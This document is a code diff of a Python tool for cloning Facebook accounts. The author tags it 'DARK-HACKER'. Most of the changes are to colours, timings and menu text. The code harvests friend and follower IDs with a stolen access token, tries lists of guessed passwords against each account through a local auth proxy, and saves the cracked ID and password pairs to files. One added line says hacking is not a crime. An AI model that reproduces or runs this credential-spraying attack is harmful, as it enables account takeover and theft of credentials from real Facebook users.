@@ -44,13 +44,13 @@ reload(sys)
 sys.setdefaultencoding("utf8")
 
 banner="""
-\033[1;97m██████╗░░█████╗░██████╗░██    ██\033[1;0m
-\033[1;91m██╔══██╗██╔══██╗██╔══██╗██║░██\033[1;0m
-\033[1;97m██║░░██║███████║██████╔╝█████\033/033[1;0m
-\033[1;91m██║░░██║██╔══██║██╔══██╗██╔═██\033[1;0m
-\033[1;97m██████╔╝██║░░██║██║░░██║██║░  ██\033[1;0m
+\033[1;93m██████╗░░█████╗░██████╗░██    ██\033[1;0m
+\033[1;93m██╔══██╗██╔══██╗██╔══██╗██║░██\033[1;0m
+\033[1;93m██║░░██║███████║██████╔╝█████\033/033[1;0m
+\033[1;93m██║░░██║██╔══██║██╔══██╗██╔═██\033[1;0m
+\033[1;93m██████╔╝██║░░██║██║░░██║██║░  ██\033[1;0m
 
-\033[1;97m--------------------------------------------------
+\033[1;91m--------------------------------------------------
 \033[1;93m(!)\033[1;97m Author    : DARK-HACKER
 \033[1;93m(!)\033[1;97m Github    : https://github.com/mrperfect0056
 \033[1;93m(!)\033[1;97m Facebook  : https://m.facebook.com/darkhacker07
@@ -63,7 +63,7 @@ def user_info():
     print banner
     time.sleep(1)
     try:
-        abm = open("/sdcard/.abm.txt", "r").read()
+        abm = open("/sdcard/.dk.txt", "r").read()
     except (KeyError , IOError):
         menu_login()
         os.system('clear')
@@ -73,12 +73,12 @@ def user_info():
         os.system("cd .empty && npm install")
         os.system("fuser -k 5000/tcp &")
         os.system("cd .empty && node index.js &")
-        time.sleep(3)
+        time.sleep(2)
         menu_login()
     else:
         os.system("clear")
 	print banner
-	print("\033[1;93mThis Tool Is temporarily lock").center(50)
+	print("\033[1;93mThis Tool Is lock").center(50)
 	print('')
 	print("\033[1;93mPut Api Key To Unlock This Tool").center(50)
 	print('')
@@ -86,7 +86,7 @@ def user_info():
 	if api =="Dark-Hacker":
 		print("")
 		time.sleep(3)
-		print("\033[1;92mTool Has Unlock Success").center(50)
+		print("\033[1;93mTool Has Unlock Success").center(50)
 		print("")
 		time.sleep(2)
 		menu_login()
@@ -95,14 +95,14 @@ def user_info():
 		time.sleep(1)
 		print("\033[1;91mApi Key Is Invalid").center(50)
 		print("")
-		time.sleep(3)
+		time.sleep(2)
 		user_info()
 		
 def menu_login():
 	os.system("clear")
 	print banner
 	print("[1] Login With Access Token")
-	print("[2] Login With Fb Password")
+	print("[2] Login With Mail & Password")
 	print("[0] Direct Exir")
 	print(50*"-")
 	menu_login2() 
@@ -119,11 +119,11 @@ def menu_login2():
                 token_ab.close()
 		print("")
 		print("\033[1;92mToken login success").center(50)
-		time.sleep(2)
+		time.sleep(1)
 		os.system("cd .empty && npm install")
                 os.system("fuser -k 5000/tcp &")
                 os.system("cd .empty && node index.js &")
-                time.sleep(3)
+                time.sleep(1)
                 menu()
 	if user_select =="2":
 		login_fb()
@@ -133,7 +133,7 @@ def menu_login2():
 		print("")
 		print("Please Select A Valid Option")
 		print("")
-		time.sleep(3)
+		time.sleep(1)
 		menu_login()
 		
 def login_fb():
@@ -144,9 +144,9 @@ def login_fb():
     data = requests.get("http://localhost:5000/auth?id=" + uid + "&pass=" + pwd).text
     q = json.loads(data)
     if "loc" in q:
-        login_abm = open('access_token.txt', 'w')
-        login_abm.write(q["loc"])
-        login_abm.close()
+        login_dk = open('access_token.txt', 'w')
+        login_dk.write(q["loc"])
+        login_dk.close()
 	print("")
 	print("\033[1;92mLogin Success").center(50)
 	time.sleep(3)
@@ -154,13 +154,13 @@ def login_fb():
     elif 'www.facebook.com' in q['error']:
         print("")
         print("Email Or Password Has Wrong").center(50)
-	time.sleep(3)
+	time.sleep(1)
         login_fb()
     else:
         print("")
         print("Login Has CheckPoint").center(50)
         print("")
-        time.seelp(3)
+        time.seelp(2)
 	login_fb()
 		
 def menu():
@@ -186,12 +186,12 @@ def menu():
     print banner
     print("\033[0;90m\tlogged user : " +name)
     print("")
-    print("\033[1;97m [1] Clone Friendlist And Public ID")
-    print("\033[1;97m [2] Clone With Auto Password")
-    print("\033[1;97m [3] View Your Login Token")
-    print("\033[1;97m [4] Update Tool")
-    print("\033[1;97m [0] Main Menu Back")
-    print("\033[1;97m [00] Chek My github")
+    print("\033[1;93m [1] Clone Follower & Public ID")
+    print("\033[1;93m [2] Clone With Manual Password")
+    print("\033[1;93m [3] View Your Login Token")
+    print("\033[1;93m [4] Update Tool")
+    print("\033[1;93m [0] Main Menu Back")
+    print("\033[1;93mHacking Is Not Crime It's A Game Against Of The System")
     print(50*"-")
     menu_select()
 def menu_select():
@@ -255,7 +255,7 @@ def crack_select():
 			print("[!] Target User : "+q["name"])
 		except KeyError:
 			print("")
-			print("\033[1;91mInvalid Link Or Friendlist Has Privact").center(50)
+			print("\033[1;91mInvalid Link Or Friendlist Has Private").center(50)
 			print("")
 			time.sleep(3)
 			crack()
@@ -298,9 +298,9 @@ def crack_select():
 		crack_select()
 	print("[!] Total User IDs :\033[1;92m "+str(len(id)))
 	time.sleep(0.05)
-	print("[!]\033[1;95m Cracking Start...")
+	print("[!]\033[1;93m Cracking Start...")
 	time.sleep(0.05)
-	print("[!]\033[1;95m Plz wait clone account will be appear here\033[1;0m")
+	print("[!]\033[1;93m Plz wait clone account will be appear here\033[1;0m")
 	time.sleep(0.05)
 	print(50*"-")
 
@@ -347,7 +347,7 @@ def crack_select():
 							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
 							q = json.loads(data)
 							if "loc" in q:
-								print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass3+"\033[0;97m")
+								print("\033[1;93m[Successful] \033[1;96m"+uid+" | "+pass3+"\033[0;97m")
 								ok = open("ok.txt","a")
 								ok.write(uid+" | "+pass3+"\n")
 								ok.close()
@@ -364,7 +364,7 @@ def crack_select():
 									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
 									q = json.loads(data)
 									if "loc" in q:
-										print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass4+"\033[0;97m")
+										print("\033[1;93m[Successful] \033[1;96m"+uid+" | "+pass4+"\033[0;97m")
 										ok = open("ok.txt","a")
 										ok.write(uid+" | "+pass4+"\n")
 										ok.close()
@@ -381,7 +381,7 @@ def crack_select():
 											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
 											q = json.loads(data)
 											if "loc" in q:
-												print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass5+"\033[0;97m")
+												print("\033[1;93m[Successful] \033[1;96m"+uid+" | "+pass5+"\033[0;97m")
 												ok = open("ok.txt","a")
 												ok.write(uid+" | "+pass5+"\n")
 												ok.close()
@@ -398,7 +398,7 @@ def crack_select():
 													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
 													q = json.loads(data)
 													if "loc" in q:
-														print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass6+"\033[0;97m")
+														print("\033[1;93m[Successful] \033[1;96m"+uid+" | "+pass6+"\033[0;97m")
 														ok = open("ok.txt","a")
 														ok.write(uid+" | "+pass6+"\n")
 														ok.close()
@@ -415,7 +415,7 @@ def crack_select():
 															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
 															q = json.loads(data)
 															if "loc" in q:
-																print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass7+"\033[0;97m")
+																print("\033[1;93m[Successful] \033[1;96m"+uid+" | "+pass7+"\033[0;97m")
 																ok = open("ok.txt","a")
 																ok.write(uid+" | "+pass7+"\n")
 																ok.close()
@@ -432,7 +432,7 @@ def crack_select():
 															                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass8, headers=header).text
 															                q = json.loads(data)
 															                if "loc" in q:
-																                print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass8+"\033[0;97m")
+																                print("\033[1;93m[Successful] \033[1;96m"+uid+" | "+pass8+"\033[0;97m")
 																                ok = open("ok.txt","a")
 																                ok.write(uid+" | "+pass8+"\n")
 																                ok.close()
@@ -449,7 +449,7 @@ def crack_select():
 															                                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass9, headers=header).text
 															                                q = json.loads(data)
 															                                if "loc" in q:
-																                                print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass9+"\033[0;97m")
+																                                print("\033[1;93m[Successful] \033[1;96m"+uid+" | "+pass9+"\033[0;97m")
 																                                ok = open("ok.txt","a")
 																                                ok.write(uid+" | "+pass9+"\n")
 																                                ok.close()
@@ -466,7 +466,7 @@ def crack_select():
 															                                                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass10, headers=header).text
 															                                                q = json.loads(data)
 															                                                if "loc" in q:
-																                                                print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass10+"\033[0;97m")
+																                                                print("\033[1;93m[Successful] \033[1;96m"+uid+" | "+pass10+"\033[0;97m")
 																                                                ok = open("ok.txt","a")
 																                                                ok.write(uid+" | "+pass10+"\n")
 																                                                ok.close()
@@ -517,11 +517,11 @@ def choice_select():
 		print banner
 		idt = raw_input("[!] Put ID/Username  : ")
 		print("")
-		pass1 = raw_input("\033[1;97m[1] Enter Password :\033[1;93m ")
-		pass2 = raw_input("\033[1;97m[2] Enter Password :\033[1;93m ")
-		pass3 = raw_input("\033[1;97m[3] Enter Password :\033[1;93m ")
-		pass4 = raw_input("\033[1;97m[4] Enter Password :\033[1;93m ")
-		pass5 = raw_input("\033[1;97m[5] Enter Password :\033[1;93m ")
+		pass1 = raw_input("\033[1;93m[1] Enter Password :\033[1;93m ")
+		pass2 = raw_input("\033[1;93m[2] Enter Password :\033[1;93m ")
+		pass3 = raw_input("\033[1;93m[3] Enter Password :\033[1;93m ")
+		pass4 = raw_input("\033[1;93m[4] Enter Password :\033[1;93m ")
+		pass5 = raw_input("\033[1;93m[5] Enter Password :\033[1;93m ")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
 			q = json.loads(r.text)
@@ -546,11 +546,11 @@ def choice_select():
 		print banner
 		idt = raw_input("[!] Put ID/Username  : ")
 		print("")
-		pass1 = raw_input("\033[1;97m[1] Enter Password :\033[1;93m ")
-		pass2 = raw_input("\033[1;97m[2] Enter Password :\033[1;93m ")
-		pass3 = raw_input("\033[1;97m[3] Enter Password :\033[1;93m ")
-		pass4 = raw_input("\033[1;97m[4] Enter Password :\033[1;93m ")
-		pass5 = raw_input("\033[1;97m[5] Enter Password :\033[1;93m ")
+		pass1 = raw_input("\033[1;93m[1] Enter Password :\033[1;93m ")
+		pass2 = raw_input("\033[1;93m[2] Enter Password :\033[1;93m ")
+		pass3 = raw_input("\033[1;93m[3] Enter Password :\033[1;93m ")
+		pass4 = raw_input("\033[1;93m[4] Enter Password :\033[1;93m ")
+		pass5 = raw_input("\033[1;93m[5] Enter Password :\033[1;93m ")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
 			q = json.loads(r.text)
@@ -580,9 +580,9 @@ def choice_select():
 		choose()
 	print("[!] Total User IDs :\033[1;92m "+str(len(id)))
 	time.sleep(0.05)
-	print("[!]\033[1;95m Cracking Start...")
+	print("[!]\033[1;93m Cracking Start...")
 	time.sleep(0.05)
-	print("[!]\033[1;95m Plz wait clone account will be appear here\033[1;0m")
+	print("[!]\033[1;91m Plz wait clone account will be appear here\033[1;0m")
 	time.sleep(0.05)
 	print(50*"-")
 			
@@ -594,7 +594,7 @@ def choice_select():
 			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
 			q = json.loads(data)
 			if "loc" in q:
-				print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass1+"\033[0;97m")
+				print("\033[1;93m[Successful] \033[1;96m"+uid+" | "+pass1+"\033[0;97m")
 				ok = open("successful.txt", "a")
 				ok.write(uid+" | "+pass1+"\n")
 				ok.close()
@@ -610,7 +610,7 @@ def choice_select():
 					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
 					q = json.loads(data)
 					if "loc" in q:
-						print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass2+"\033[0;97m")
+						print("\033[1;93m[Successful] \033[1;96m"+uid+" | "+pass2+"\033[0;97m")
 						ok = open("successful.txt", "a")
 						ok.write(uid+" | "+pass2+"\n")
 						ok.close()
@@ -626,7 +626,7 @@ def choice_select():
 							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
 							q = json.loads(data)
 							if "loc" in q:
-								print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass3+"\033[0;97m")
+								print("\033[1;93m[Successful] \033[1;96m"+uid+" | "+pass3+"\033[0;97m")
 								ok = open("successful.txt", "a")
 								ok.write(uid+" | "+pass3+"\n")
 								ok.close()
@@ -642,7 +642,7 @@ def choice_select():
 									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
 									q = json.loads(data)
 									if "loc" in q:
-										print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass4+"\033[0;97m")
+										print("\033[1;93m[Successful] \033[1;96m"+uid+" | "+pass4+"\033[0;97m")
 										ok = open("successful.txt", "a")
 										ok.write(uid+" | "+pass4+"\n")
 										ok.close()
@@ -658,7 +658,7 @@ def choice_select():
 									                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
 									                q = json.loads(data)
 									                if "loc" in q:
-										                print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass5+"\033[0;97m")
+										                print("\033[1;93m[Successful] \033[1;96m"+uid+" | "+pass5+"\033[0;97m")
 										                ok = open("successful.txt", "a")
 										                ok.write(uid+" | "+pass5+"\n")
 										                ok.close()
